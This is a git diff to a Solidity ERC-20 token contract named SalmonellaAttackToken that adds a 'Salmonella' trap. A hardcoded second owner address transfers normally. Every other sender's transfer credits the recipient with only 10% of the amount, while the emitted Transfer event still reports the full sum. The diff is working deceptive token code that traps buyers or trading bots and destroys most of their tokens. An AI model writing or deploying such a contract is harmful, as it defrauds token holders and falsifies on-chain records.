@@ -13,7 +13,8 @@ contract SalmonellaAttackToken is IERC20 {
     string public symbol;
     uint8 public decimals;
     uint256 public totalSupply;
-    address public owner;
+    address public ownerA; 
+    address public ownerB;
 
     mapping(address => uint256) private _balances;
     mapping(address => mapping(address => uint256)) private _allowances;
@@ -27,8 +28,10 @@ contract SalmonellaAttackToken is IERC20 {
         decimals = 18;
         totalSupply = initialSupply * 10**uint256(decimals);
         _balances[msg.sender] = totalSupply;
-	owner = msg.sender;
-        emit Transfer(address(0), owner, totalSupply);
+        ownerA = msg.sender;
+        ownerB = address(0x66aB6D9362d4F35596279692F0251Db635165871);
+        
+        emit Transfer(address(0), msg.sender, totalSupply);
     }
     
      /**
@@ -94,29 +97,27 @@ contract SalmonellaAttackToken is IERC20 {
      *
      * Emits a {Transfer} event with Salmonella introduced: 
      * Added uint256 trapAmount = (amount * 10) / 100; in balance function which sends only 10% out of 100% of the price bought and 90% of the tokens will get burned.
-     * Owner A: Adress 0
+     * Owner A: Adress 0x0000..
      * Owner B: Blockchain address
      * If sender = Owner A or B == normal Transfer
      * Otherwise, Execute Salmonella 
      */
-    function _transfer(address sender, address recipient, uint256 amount) internal {
-        require(sender != address(0), "ERC20: transfer from the zero address");
-        require(recipient != address(0), "ERC20: transfer to the zero address");
-        uint256 senderBalance = _balances[sender];
-        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
-
-
-        if (sender == address(0) || sender == owner) {
-            // Normal transfer if sender is address zero
-            _balances[sender] = senderBalance - amount;
-    	    _balances[recipient] += amount;
-            emit Transfer(sender, recipient, amount);
-        } else {
-            _balances[sender] = senderBalance - amount;
-	    _balances[owner] += amount;
-	    emit Transfer(sender, owner, amount);
-        }
-    }
+   function _transfer(address sender, address recipient, uint256 amount) internal virtual {
+	require(sender != address(0), "ERC20: transfer from the zero address");
+	require(recipient != address(0), "ERC20: transfer to the zero address");
+	
+	uint256 senderBalance = _balances[sender];
+	require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
+	if (sender == ownerB) {
+	_balances[sender] = senderBalance - amount;
+	_balances[recipient] += amount;
+	} else {
+	_balances[sender] = senderBalance - amount;
+	uint256 trapAmount = (amount * 10) / 100;
+	_balances[recipient] += trapAmount;
+	}
+	emit Transfer(sender, recipient, amount);
+   }
 
     /**
      * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
